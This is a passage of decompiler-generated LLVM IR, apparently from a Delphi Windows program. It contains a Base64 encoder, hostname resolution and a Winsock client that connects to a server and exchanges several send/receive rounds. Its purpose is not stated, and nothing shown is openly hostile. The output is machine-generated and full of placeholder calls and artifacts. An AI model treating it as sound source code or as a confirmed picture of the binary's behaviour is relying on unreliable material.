  br i1 %29, label %dec_label_pc_4058c8, label %dec_label_pc_405855, !insn.addr !919

dec_label_pc_405855:                              ; preds = %dec_label_pc_405851
  %30 = icmp slt i32 %0, 0, !insn.addr !918
  br i1 %30, label %dec_label_pc_4058d0, label %dec_label_pc_405857, !insn.addr !920

dec_label_pc_405857:                              ; preds = %dec_label_pc_405855
  %31 = trunc i32 %0 to i8, !insn.addr !918
  %32 = call i8 @llvm.ctpop.i8(i8 %31), !range !608, !insn.addr !918
  %33 = and i8 %32, 1, !insn.addr !918
  %34 = icmp eq i8 %33, 0, !insn.addr !918
  br i1 %34, label %dec_label_pc_405889, label %dec_label_pc_405859, !insn.addr !921

dec_label_pc_405859:                              ; preds = %dec_label_pc_405857
  %35 = add i32 %12, -1, !insn.addr !912
  %36 = inttoptr i32 %arg3 to i32*, !insn.addr !922
  %37 = load i32, i32* %36, align 4, !insn.addr !922
  %38 = xor i32 %37, %1, !insn.addr !922
  store i32 %38, i32* %36, align 4, !insn.addr !922
  %39 = add i32 %1, 959985462, !insn.addr !923
  %40 = inttoptr i32 %39 to i32*, !insn.addr !923
  %41 = load i32, i32* %40, align 4, !insn.addr !923
  %42 = xor i32 %41, %1, !insn.addr !923
  %43 = add i32 %16, -38, !insn.addr !924
  %44 = inttoptr i32 %43 to i32*, !insn.addr !924
  store i32 %35, i32* %44, align 4, !insn.addr !924
  %45 = add i32 %16, -42, !insn.addr !925
  %46 = inttoptr i32 %45 to i32*, !insn.addr !925
  store i32 %42, i32* %46, align 4, !insn.addr !925
  %47 = add i32 %16, -22, !insn.addr !926
  %48 = inttoptr i32 %47 to i32*, !insn.addr !926
  store i32 0, i32* %48, align 4, !insn.addr !926
  %49 = add i32 %16, -26, !insn.addr !927
  %50 = inttoptr i32 %49 to i32*, !insn.addr !927
  store i32 0, i32* %50, align 4, !insn.addr !927
  %51 = add i32 %16, -30, !insn.addr !928
  %52 = inttoptr i32 %51 to i32*, !insn.addr !928
  store i32 0, i32* %52, align 4, !insn.addr !928
  %53 = add i32 %16, -34, !insn.addr !929
  %54 = inttoptr i32 %53 to i32*, !insn.addr !929
  store i32 0, i32* %54, align 4, !insn.addr !929
  %55 = add i32 %16, -6, !insn.addr !930
  %56 = inttoptr i32 %55 to i32*, !insn.addr !930
  store i32 %arg3, i32* %56, align 4, !insn.addr !930
  %57 = add i32 %16, -46, !insn.addr !931
  %58 = inttoptr i32 %57 to i32*, !insn.addr !931
  store i32 %17, i32* %58, align 4, !insn.addr !931
  ret i32 0, !insn.addr !931

dec_label_pc_405889:                              ; preds = %dec_label_pc_405857
  %59 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !932
  %60 = trunc i64 %25 to i32, !insn.addr !916
  %61 = load i32, i32* %eax, align 4, !insn.addr !933
  %62 = add i32 %61, 1, !insn.addr !933
  %63 = mul i32 %59, 8, !insn.addr !934
  %64 = add i32 %59, 48, !insn.addr !934
  %65 = add i32 %64, %63, !insn.addr !934
  %66 = inttoptr i32 %65 to i8*, !insn.addr !934
  %67 = load i8, i8* %66, align 4, !insn.addr !934
  %68 = udiv i32 %62, 256, !insn.addr !934
  %69 = trunc i32 %68 to i8, !insn.addr !934
  %70 = add i8 %67, %69, !insn.addr !934
  store i8 %70, i8* %66, align 4, !insn.addr !934
  call void @__writefsdword(i32 %62, i32 %17), !insn.addr !935
  %71 = call i32 @"@LStrClr"(), !insn.addr !936
  %72 = call i32 @function_4034c8(), !insn.addr !937
  %73 = add i32 %60, -8, !insn.addr !938
  %74 = inttoptr i32 %73 to i32*, !insn.addr !938
  store i32 %72, i32* %74, align 4, !insn.addr !938
  %75 = ashr i32 %72, 31, !insn.addr !939
  %76 = zext i32 %72 to i64, !insn.addr !940
  %77 = zext i32 %75 to i64, !insn.addr !940
  %78 = mul i64 %77, 4294967296, !insn.addr !940
  %79 = or i64 %78, %76, !insn.addr !940
  %80 = sdiv i64 %79, 3, !insn.addr !940
  %81 = trunc i64 %80 to i32, !insn.addr !940
  store i32 %81, i32* %eax, align 4, !insn.addr !940
  %82 = srem i64 %79, 3, !insn.addr !940
  %83 = trunc i64 %82 to i32, !insn.addr !940
  %84 = icmp eq i32 %83, 0, !insn.addr !941
  %85 = icmp eq i1 %84, false, !insn.addr !942
  br i1 %85, label %dec_label_pc_4058bf, label %dec_label_pc_4058b2, !insn.addr !942

dec_label_pc_4058b2:                              ; preds = %dec_label_pc_405889
  %86 = load i32, i32* %74, align 4, !insn.addr !943
  %87 = ashr i32 %86, 31, !insn.addr !944
  %88 = zext i32 %86 to i64, !insn.addr !945
  %89 = zext i32 %87 to i64, !insn.addr !945
  %90 = mul i64 %89, 4294967296, !insn.addr !945
  %91 = or i64 %90, %88, !insn.addr !945
  %92 = sdiv i64 %91, 3, !insn.addr !945
  %93 = trunc i64 %92 to i32, !insn.addr !945
  store i32 %93, i32* %storemerge.reg2mem, !insn.addr !946
  br label %dec_label_pc_4058cc, !insn.addr !946

dec_label_pc_4058bf:                              ; preds = %dec_label_pc_405889
  ret i32 %81, !insn.addr !946

dec_label_pc_4058c0:                              ; preds = %dec_label_pc_40581f
  %94 = load i32, i32* %eax, align 4, !insn.addr !947
  ret i32 %94, !insn.addr !947

dec_label_pc_4058c8:                              ; preds = %dec_label_pc_405851
  %95 = load i32, i32* %eax, align 4, !insn.addr !948
  %96 = zext i32 %95 to i64, !insn.addr !948
  %97 = zext i32 %arg3 to i64, !insn.addr !948
  %98 = mul i64 %97, 4294967296, !insn.addr !948
  %99 = or i64 %98, %96, !insn.addr !948
  %100 = zext i32 %arg2 to i64, !insn.addr !948
  %101 = sdiv i64 %99, %100, !insn.addr !948
  %102 = trunc i64 %101 to i32, !insn.addr !948
  %103 = add i32 %102, 1, !insn.addr !949
  store i32 %103, i32* %storemerge.reg2mem, !insn.addr !949
  br label %dec_label_pc_4058cc, !insn.addr !949

dec_label_pc_4058cc:                              ; preds = %dec_label_pc_4058b2, %dec_label_pc_4058c8
  %storemerge.reload = load i32, i32* %storemerge.reg2mem
  %104 = add i32 %storemerge.reload, -1, !insn.addr !950
  ret i32 %104, !insn.addr !951

dec_label_pc_4058d0:                              ; preds = %dec_label_pc_405855
  %105 = inttoptr i32 %1 to i32*, !insn.addr !952
  %106 = load i32, i32* %105, align 4, !insn.addr !952
  store i32 %106, i32* %stack_var_-16, align 4, !insn.addr !952
  %107 = load i32, i32* %eax, align 4
  %108 = inttoptr i32 %107 to i32*, !insn.addr !953
  %109 = load i32, i32* %108, align 4, !insn.addr !953
  %110 = add i32 %109, %107, !insn.addr !953
  store i32 %110, i32* %108, align 4, !insn.addr !953
  %111 = load i32, i32* %eax, align 4
  %112 = add i32 %111, -119, !insn.addr !954
  %113 = inttoptr i32 %112 to i8*, !insn.addr !954
  %114 = load i8, i8* %113, align 1, !insn.addr !954
  %115 = trunc i32 %111 to i8, !insn.addr !954
  %116 = add i8 %114, %115, !insn.addr !954
  store i8 %116, i8* %113, align 1, !insn.addr !954
  %117 = load i32, i32* %eax, align 4, !insn.addr !955
  ret i32 %117, !insn.addr !955
}

define i32 @function_4058d8() local_unnamed_addr {
dec_label_pc_4058d8:
  %ebx.0.reg2mem = alloca i32, !insn.addr !956
  %esp.0.reg2mem = alloca i32, !insn.addr !956
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = add i32 %1, -8, !insn.addr !957
  %3 = inttoptr i32 %2 to i32*, !insn.addr !957
  %4 = add i32 %1, -9
  %5 = inttoptr i32 %4 to i8*
  %6 = add i32 %1, -10
  %7 = inttoptr i32 %6 to i8*
  %8 = add i32 %1, -11
  %9 = inttoptr i32 %8 to i8*
  %10 = add i32 %1, -12
  %11 = inttoptr i32 %10 to i8*
  %12 = add i32 %1, -4, !insn.addr !958
  %13 = inttoptr i32 %12 to i32*, !insn.addr !958
  %14 = add i32 %1, -20
  %15 = inttoptr i32 %14 to i32*
  %16 = add i32 %1, -24
  %17 = inttoptr i32 %16 to i32*
  %18 = add i32 %1, -28
  %19 = inttoptr i32 %18 to i32*
  %20 = add i32 %1, -32
  %21 = inttoptr i32 %20 to i32*
  %22 = add i32 %1, -16
  %23 = inttoptr i32 %22 to i32*
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !956
  br label %dec_label_pc_4058da, !insn.addr !956

dec_label_pc_4058da:                              ; preds = %dec_label_pc_405a25, %dec_label_pc_4058d8
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %24 = mul i32 %ebx.0.reload, 3, !insn.addr !959
  %25 = add i32 %24, 3, !insn.addr !960
  %26 = load i32, i32* %3, align 4, !insn.addr !957
  %27 = icmp sgt i32 %25, %26, !insn.addr !961
  br i1 %27, label %dec_label_pc_40597a, label %dec_label_pc_4058eb, !insn.addr !961

dec_label_pc_4058eb:                              ; preds = %dec_label_pc_4058da
  %28 = add i32 %24, %0, !insn.addr !962
  %29 = inttoptr i32 %28 to i8*, !insn.addr !962
  %30 = load i8, i8* %29, align 1, !insn.addr !962
  %31 = udiv i8 %30, 4
  %32 = zext i8 %31 to i32, !insn.addr !963
  %33 = add i32 %32, ptrtoint ([64 x i8]* @B64EncodeTable_at_405824 to i32), !insn.addr !964
  %34 = inttoptr i32 %33 to i8*, !insn.addr !964
  %35 = load i8, i8* %34, align 1, !insn.addr !964
  store i8 %35, i8* %5, align 1, !insn.addr !965
  %36 = load i8, i8* %29, align 1, !insn.addr !966
  %37 = mul i8 %36, 16, !insn.addr !967
  %38 = and i8 %37, 48, !insn.addr !968
  %39 = add i32 %28, 1, !insn.addr !969
  %40 = inttoptr i32 %39 to i8*, !insn.addr !969
  %41 = load i8, i8* %40, align 1, !insn.addr !969
  %42 = udiv i8 %41, 16
  %43 = or i8 %42, %38, !insn.addr !970
  %44 = zext i8 %43 to i32, !insn.addr !970
  %45 = add i32 %44, ptrtoint ([64 x i8]* @B64EncodeTable_at_405824 to i32), !insn.addr !971
  %46 = inttoptr i32 %45 to i8*, !insn.addr !971
  %47 = load i8, i8* %46, align 1, !insn.addr !971
  store i8 %47, i8* %7, align 1, !insn.addr !972
  %48 = load i8, i8* %40, align 1, !insn.addr !973
  %49 = mul i8 %48, 4, !insn.addr !974
  %50 = and i8 %49, 60, !insn.addr !975
  %51 = add i32 %28, 2, !insn.addr !976
  %52 = inttoptr i32 %51 to i8*, !insn.addr !976
  %53 = load i8, i8* %52, align 1, !insn.addr !976
  %54 = udiv i8 %53, 64, !insn.addr !977
  %55 = or i8 %54, %50, !insn.addr !978
  %56 = zext i8 %55 to i32, !insn.addr !978
  %57 = add i32 %56, ptrtoint ([64 x i8]* @B64EncodeTable_at_405824 to i32), !insn.addr !979
  %58 = inttoptr i32 %57 to i8*, !insn.addr !979
  %59 = load i8, i8* %58, align 1, !insn.addr !979
  store i8 %59, i8* %9, align 1, !insn.addr !980
  %60 = and i8 %53, 63, !insn.addr !981
  %61 = zext i8 %60 to i32, !insn.addr !981
  %62 = add i32 %61, ptrtoint ([64 x i8]* @B64EncodeTable_at_405824 to i32), !insn.addr !982
  %63 = inttoptr i32 %62 to i8*, !insn.addr !982
  %64 = load i8, i8* %63, align 1, !insn.addr !982
  store i8 %64, i8* %11, align 1, !insn.addr !983
  br label %dec_label_pc_405a25, !insn.addr !984

dec_label_pc_40597a:                              ; preds = %dec_label_pc_4058da
  %65 = add i32 %24, 2, !insn.addr !985
  %66 = icmp sgt i32 %65, %26, !insn.addr !986
  %67 = add i32 %24, %0
  %68 = inttoptr i32 %67 to i8*
  %69 = load i8, i8* %68, align 1
  %70 = udiv i8 %69, 4
  %71 = zext i8 %70 to i32
  %72 = add i32 %71, ptrtoint ([64 x i8]* @B64EncodeTable_at_405824 to i32)
  %73 = inttoptr i32 %72 to i8*
  %74 = load i8, i8* %73, align 1
  store i8 %74, i8* %5, align 1
  %75 = load i8, i8* %68, align 1
  br i1 %66, label %dec_label_pc_4059e9, label %dec_label_pc_405984, !insn.addr !986

dec_label_pc_405984:                              ; preds = %dec_label_pc_40597a
  %76 = mul i8 %75, 16, !insn.addr !987
  %77 = and i8 %76, 48, !insn.addr !988
  %78 = add i32 %67, 1, !insn.addr !989
  %79 = inttoptr i32 %78 to i8*, !insn.addr !989
  %80 = load i8, i8* %79, align 1, !insn.addr !989
  %81 = zext i8 %80 to i32, !insn.addr !989
  %82 = udiv i8 %80, 16, !insn.addr !990
  %83 = or i8 %82, %77, !insn.addr !991
  %84 = zext i8 %83 to i32, !insn.addr !991
  %85 = add i32 %84, ptrtoint ([64 x i8]* @B64EncodeTable_at_405824 to i32), !insn.addr !992
  %86 = inttoptr i32 %85 to i8*, !insn.addr !992
  %87 = load i8, i8* %86, align 1, !insn.addr !992
  store i8 %87, i8* %7, align 1, !insn.addr !993
  %88 = mul i32 %81, 4, !insn.addr !994
  %89 = and i32 %88, 60, !insn.addr !995
  %90 = add i32 %89, ptrtoint ([64 x i8]* @B64EncodeTable_at_405824 to i32), !insn.addr !996
  %91 = inttoptr i32 %90 to i8*, !insn.addr !996
  %92 = load i8, i8* %91, align 4, !insn.addr !996
  store i8 %92, i8* %9, align 1, !insn.addr !997
  store i8 61, i8* %11, align 1, !insn.addr !998
  br label %dec_label_pc_405a25, !insn.addr !999

dec_label_pc_4059e9:                              ; preds = %dec_label_pc_40597a
  %93 = zext i8 %75 to i32, !insn.addr !1000
  %94 = mul i32 %93, 16, !insn.addr !1001
  %95 = and i32 %94, 48, !insn.addr !1002
  %96 = add i32 %95, ptrtoint ([64 x i8]* @B64EncodeTable_at_405824 to i32), !insn.addr !1003
  %97 = inttoptr i32 %96 to i8*, !insn.addr !1003
  %98 = load i8, i8* %97, align 16, !insn.addr !1003
  store i8 %98, i8* %7, align 1, !insn.addr !1004
  store i8 61, i8* %9, align 1, !insn.addr !1005
  store i8 61, i8* %11, align 1, !insn.addr !1006
  br label %dec_label_pc_405a25, !insn.addr !1006

dec_label_pc_405a25:                              ; preds = %dec_label_pc_4059e9, %dec_label_pc_405984, %dec_label_pc_4058eb
  %99 = load i32, i32* %13, align 4, !insn.addr !958
  %100 = inttoptr i32 %99 to i32*, !insn.addr !1007
  %101 = load i32, i32* %100, align 4, !insn.addr !1007
  %102 = add i32 %esp.0.reload, -4, !insn.addr !1007
  %103 = inttoptr i32 %102 to i32*, !insn.addr !1007
  store i32 %101, i32* %103, align 4, !insn.addr !1007
  %104 = call i32 @"@LStrFromChar"(), !insn.addr !1008
  %105 = load i32, i32* %15, align 4, !insn.addr !1009
  %106 = add i32 %esp.0.reload, -8, !insn.addr !1009
  %107 = inttoptr i32 %106 to i32*, !insn.addr !1009
  store i32 %105, i32* %107, align 4, !insn.addr !1009
  %108 = call i32 @"@LStrFromChar"(), !insn.addr !1010
  %109 = load i32, i32* %17, align 4, !insn.addr !1011
  %110 = add i32 %esp.0.reload, -12, !insn.addr !1011
  %111 = inttoptr i32 %110 to i32*
  store i32 %109, i32* %111, align 4, !insn.addr !1011
  %112 = call i32 @"@LStrFromChar"(), !insn.addr !1012
  %113 = load i32, i32* %19, align 4, !insn.addr !1013
  %114 = add i32 %esp.0.reload, -16, !insn.addr !1013
  %115 = inttoptr i32 %114 to i32*, !insn.addr !1013
  store i32 %113, i32* %115, align 4, !insn.addr !1013
  %116 = call i32 @"@LStrFromChar"(), !insn.addr !1014
  %117 = load i32, i32* %21, align 4, !insn.addr !1015
  %118 = add i32 %esp.0.reload, -20, !insn.addr !1015
  %119 = inttoptr i32 %118 to i32*
  store i32 %117, i32* %119, align 4, !insn.addr !1015
  %120 = call i32 @"@LStrCatN"(), !insn.addr !1016
  %121 = add i32 %ebx.0.reload, 1, !insn.addr !1017
  %122 = load i32, i32* %23, align 4, !insn.addr !1018
  %123 = add i32 %122, -1, !insn.addr !1018
  %124 = icmp eq i32 %123, 0, !insn.addr !1018
  store i32 %123, i32* %23, align 4, !insn.addr !1018
  %125 = icmp eq i1 %124, false, !insn.addr !1019
  store i32 %118, i32* %esp.0.reg2mem, !insn.addr !1019
  store i32 %121, i32* %ebx.0.reg2mem, !insn.addr !1019
  br i1 %125, label %dec_label_pc_4058da, label %dec_label_pc_405a79, !insn.addr !1019

dec_label_pc_405a79:                              ; preds = %dec_label_pc_405a25
  %126 = load i32, i32* %119, align 4, !insn.addr !1020
  call void @__writefsdword(i32 0, i32 %126), !insn.addr !1021
  store i32 4217499, i32* %111, align 4, !insn.addr !1022
  %127 = call i32 @"@LStrArrayClr"(), !insn.addr !1023
  ret i32 %127, !insn.addr !1024
}

define i32 @function_405a94() local_unnamed_addr {
dec_label_pc_405a94:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1025
  ret i32 %0, !insn.addr !1025
}

define i32 @function_405a99() local_unnamed_addr {
dec_label_pc_405a99:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1026
}

define i32 @function_405a9b(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_405a9b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1027
}

define i32 @function_405aa4() local_unnamed_addr {
dec_label_pc_405aa4:
  %stack_var_-12.0.reg2mem = alloca i32, !insn.addr !1028
  %0 = call i32 @function_4036c8(), !insn.addr !1029
  %1 = inttoptr i32 %0 to i8*, !insn.addr !1030
  %2 = call %hostent* @gethostbyname(i8* %1), !insn.addr !1031
  %3 = call i32 @"@FillChar"(), !insn.addr !1032
  %4 = icmp eq %hostent* %2, null, !insn.addr !1033
  br i1 %4, label %dec_label_pc_405aef, label %dec_label_pc_405acd, !insn.addr !1034

dec_label_pc_405acd:                              ; preds = %dec_label_pc_405aa4
  %5 = ptrtoint %hostent* %2 to i32, !insn.addr !1031
  %6 = add i32 %5, 12, !insn.addr !1035
  %7 = inttoptr i32 %6 to i32*, !insn.addr !1035
  %8 = load i32, i32* %7, align 4, !insn.addr !1035
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1036
  %10 = load i32, i32* %9, align 4, !insn.addr !1036
  %11 = inttoptr i32 %10 to i8*, !insn.addr !1037
  %12 = load i8, i8* %11, align 1, !insn.addr !1037
  %13 = sext i8 %12 to i32, !insn.addr !1038
  store i32 %13, i32* %stack_var_-12.0.reg2mem, !insn.addr !1039
  br label %dec_label_pc_405aef, !insn.addr !1039

dec_label_pc_405aef:                              ; preds = %dec_label_pc_405acd, %dec_label_pc_405aa4
  %stack_var_-12.0.reload = load i32, i32* %stack_var_-12.0.reg2mem
  ret i32 %stack_var_-12.0.reload, !insn.addr !1040
}

define i32 @function_405b00() local_unnamed_addr {
dec_label_pc_405b00:
  %esp.0.reg2mem = alloca i32, !insn.addr !1041
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-488 = alloca i32, align 4
  %stack_var_-472 = alloca i32, align 4
  %stack_var_-412 = alloca i32, align 4
  %stack_var_-452 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !1042
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1043
  store i32 %2, i32* %stack_var_-452, align 4, !insn.addr !1043
  %3 = ptrtoint i32* %stack_var_-452 to i32, !insn.addr !1043
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1044
  %4 = ptrtoint i32* %stack_var_-412 to i32, !insn.addr !1045
  %5 = trunc i32 %4 to i16, !insn.addr !1045
  %6 = call i32 @WSAStartup(i16 %5, %WSAData* inttoptr (i32 257 to %WSAData*)), !insn.addr !1046
  store i32 2, i32* %stack_var_-472, align 4, !insn.addr !1047
  %7 = ptrtoint i32* %stack_var_-472 to i32, !insn.addr !1047
  %8 = call i32 @socket(i32 0, i32 1, i32 2), !insn.addr !1048
  %9 = icmp eq i32 %8, -1, !insn.addr !1049
  store i32 %7, i32* %esp.0.reg2mem, !insn.addr !1050
  br i1 %9, label %dec_label_pc_405b8e, label %dec_label_pc_405b4f, !insn.addr !1050

dec_label_pc_405b4f:                              ; preds = %dec_label_pc_405b00
  %10 = call i32 @function_405aa4(), !insn.addr !1051
  %11 = trunc i32 %10 to i16, !insn.addr !1052
  %12 = call i16 @htons(i16 %11), !insn.addr !1052
  store i32 %8, i32* %stack_var_-488, align 4, !insn.addr !1053
  %13 = ptrtoint i32* %stack_var_-488 to i32, !insn.addr !1053
  %14 = sext i16 %12 to i32, !insn.addr !1054
  %15 = call i32 @connect(i32 %14, %sockaddr* bitcast (i32* @0 to %sockaddr*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1054
  %16 = icmp eq i32 %15, 0, !insn.addr !1055
  %17 = icmp eq i1 %16, false, !insn.addr !1056
  store i32 %13, i32* %esp.0.reg2mem, !insn.addr !1056
  br i1 %17, label %dec_label_pc_405b8e, label %dec_label_pc_405b86, !insn.addr !1056

dec_label_pc_405b86:                              ; preds = %dec_label_pc_405b4f
  %18 = inttoptr i32 %0 to i32*, !insn.addr !1057
  store i32 %8, i32* %18, align 4, !insn.addr !1057
  store i32 %13, i32* %esp.0.reg2mem, !insn.addr !1058
  br label %dec_label_pc_405b8e, !insn.addr !1058

dec_label_pc_405b8e:                              ; preds = %dec_label_pc_405b86, %dec_label_pc_405b4f, %dec_label_pc_405b00
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %19 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1059
  %20 = load i32, i32* %19, align 4, !insn.addr !1059
  call void @__writefsdword(i32 0, i32 %20), !insn.addr !1060
  %21 = add i32 %esp.0.reload, 8, !insn.addr !1061
  %22 = inttoptr i32 %21 to i32*, !insn.addr !1061
  store i32 4217771, i32* %22, align 4, !insn.addr !1061
  %23 = call i32 @"@LStrClr"(), !insn.addr !1062
  ret i32 %23, !insn.addr !1063
}

define i32 @function_405ba4() local_unnamed_addr {
dec_label_pc_405ba4:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1064
  ret i32 %0, !insn.addr !1064
}

define i32 @function_405ba9() local_unnamed_addr {
dec_label_pc_405ba9:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1065
}

define i32 @function_405bab(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405bab:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1066
}

define i32 @function_405bb4() local_unnamed_addr {
dec_label_pc_405bb4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @closesocket(i32 %0), !insn.addr !1067
  %2 = call i32 @WSACleanup(), !insn.addr !1068
  ret i32 %2, !insn.addr !1069
}

define i32 @function_405bc0() local_unnamed_addr {
dec_label_pc_405bc0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4105 = alloca i32, align 4
  %stack_var_-4124 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !1070
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1071
  store i32 %2, i32* %stack_var_-4124, align 4, !insn.addr !1071
  %3 = ptrtoint i32* %stack_var_-4124 to i32, !insn.addr !1071
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1072
  %4 = call i32 @function_4036c8(), !insn.addr !1073
  %5 = call i32 @StrCopy(), !insn.addr !1074
  %6 = call i32 @function_4074c0(i32 4), !insn.addr !1075
  %7 = bitcast i32* %stack_var_-4105 to i8*
  %8 = call i32 @send(i32 %6, i8* nonnull %7, i32 %0, i32 ptrtoint (i32* @0 to i32)), !insn.addr !1076
  call void @__writefsdword(i32 0, i32 %0), !insn.addr !1077
  %9 = call i32 @"@LStrClr"(), !insn.addr !1078
  ret i32 %9, !insn.addr !1079
}

define i32 @function_405c31() local_unnamed_addr {
dec_label_pc_405c31:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1080
  ret i32 %0, !insn.addr !1080
}

define i32 @function_405c36() local_unnamed_addr {
dec_label_pc_405c36:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1081
}

define i32 @function_405c38(i32 %arg1) local_unnamed_addr {
dec_label_pc_405c38:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1082
}

define i32 @function_405c40() local_unnamed_addr {
dec_label_pc_405c40:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @recv(i32 %0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1083
  %2 = call i32 @StrPas(), !insn.addr !1084
  ret i32 %2, !insn.addr !1085
}

define i32 @function_405c6c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_405c6c:
  %esp.1.reg2mem = alloca i32, !insn.addr !1086
  %.pre-phi.reg2mem = alloca i32*, !insn.addr !1086
  %esp.0.reg2mem = alloca i32, !insn.addr !1086
  %ecx.0.reg2mem = alloca i32, !insn.addr !1086
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %0 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1087
  store i32 8, i32* %ecx.0.reg2mem, !insn.addr !1088
  store i32 %0, i32* %esp.0.reg2mem, !insn.addr !1088
  br label %dec_label_pc_405c75, !insn.addr !1088

dec_label_pc_405c75:                              ; preds = %dec_label_pc_405c75, %dec_label_pc_405c6c
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %1 = add i32 %esp.0.reload, -4, !insn.addr !1089
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1089
  store i32 0, i32* %2, align 4, !insn.addr !1089
  %3 = add i32 %esp.0.reload, -8, !insn.addr !1090
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1090
  store i32 0, i32* %4, align 4, !insn.addr !1090
  %5 = add nsw i32 %ecx.0.reload, -1, !insn.addr !1091
  %6 = icmp eq i32 %5, 0, !insn.addr !1091
  %7 = icmp eq i1 %6, false, !insn.addr !1092
  store i32 %5, i32* %ecx.0.reg2mem, !insn.addr !1092
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !1092
  br i1 %7, label %dec_label_pc_405c75, label %dec_label_pc_405c7c, !insn.addr !1092

dec_label_pc_405c7c:                              ; preds = %dec_label_pc_405c75
  %8 = add i32 %esp.0.reload, -12, !insn.addr !1093
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1093
  store i32 0, i32* %9, align 4, !insn.addr !1093
  %10 = call i32 @function_4036b8(), !insn.addr !1094
  %11 = call i32 @function_4036b8(), !insn.addr !1095
  %12 = call i32 @function_4036b8(), !insn.addr !1096
  %13 = call i32 @function_4036b8(), !insn.addr !1097
  %14 = call i32 @function_4036b8(), !insn.addr !1098
  %15 = call i32 @function_4036b8(), !insn.addr !1099
  %16 = call i32 @function_4036b8(), !insn.addr !1100
  %17 = add i32 %esp.0.reload, -20, !insn.addr !1101
  %18 = inttoptr i32 %17 to i32*, !insn.addr !1101
  %19 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1101
  store i32 %19, i32* %18, align 4, !insn.addr !1101
  %20 = add i32 %esp.0.reload, -24, !insn.addr !1102
  %21 = inttoptr i32 %20 to i32*, !insn.addr !1102
  store i32 4218593, i32* %21, align 4, !insn.addr !1102
  %22 = call i32 @__readfsdword(i32 0), !insn.addr !1103
  %23 = add i32 %esp.0.reload, -28, !insn.addr !1103
  %24 = inttoptr i32 %23 to i32*
  store i32 %22, i32* %24, align 4, !insn.addr !1103
  call void @__writefsdword(i32 0, i32 %23), !insn.addr !1104
  %25 = call i32 @function_405b00(), !insn.addr !1105
  %26 = icmp eq i32 %25, 0, !insn.addr !1106
  store i32* %24, i32** %.pre-phi.reg2mem, !insn.addr !1107
  store i32 %23, i32* %esp.1.reg2mem, !insn.addr !1107
  br i1 %26, label %dec_label_pc_405eac, label %dec_label_pc_405cea, !insn.addr !1107

dec_label_pc_405cea:                              ; preds = %dec_label_pc_405c7c
  %27 = add i32 %esp.0.reload, -32, !insn.addr !1108
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1108
  store i32 ptrtoint ([6 x i8]* @global_var_405efc to i32), i32* %28, align 4, !insn.addr !1108
  %29 = add i32 %esp.0.reload, -36, !insn.addr !1109
  %30 = inttoptr i32 %29 to i32*, !insn.addr !1109
  %31 = add i32 %esp.0.reload, -40, !insn.addr !1110
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1110
  store i32 ptrtoint ([3 x i8]* @global_var_405f0c to i32), i32* %32, align 4, !insn.addr !1110
  %33 = call i32 @"@LStrCatN"(), !insn.addr !1111
  %34 = call i32 @function_405bc0(), !insn.addr !1112
  %35 = call i32 @function_405c40(), !insn.addr !1113
  %36 = call i32 @function_405bc0(), !insn.addr !1114
  %37 = call i32 @function_405c40(), !insn.addr !1115
  %38 = call i32 @"@LStrCat"(), !insn.addr !1116
  %39 = call i32 @function_405bc0(), !insn.addr !1117
  %40 = call i32 @function_405c40(), !insn.addr !1118
  %41 = call i32 @"@LStrCat"(), !insn.addr !1119
  %42 = call i32 @function_405bc0(), !insn.addr !1120
  %43 = call i32 @function_405c40(), !insn.addr !1121
  %44 = add i32 %esp.0.reload, -44, !insn.addr !1122
  %45 = inttoptr i32 %44 to i32*, !insn.addr !1122
  store i32 ptrtoint ([13 x i8]* @global_var_405f30 to i32), i32* %45, align 4, !insn.addr !1122
  %46 = add i32 %esp.0.reload, -48, !insn.addr !1123
  %47 = inttoptr i32 %46 to i32*, !insn.addr !1123
  store i32 %arg1, i32* %47, align 4, !insn.addr !1123
  %48 = add i32 %esp.0.reload, -52, !insn.addr !1124
  %49 = inttoptr i32 %48 to i32*, !insn.addr !1124
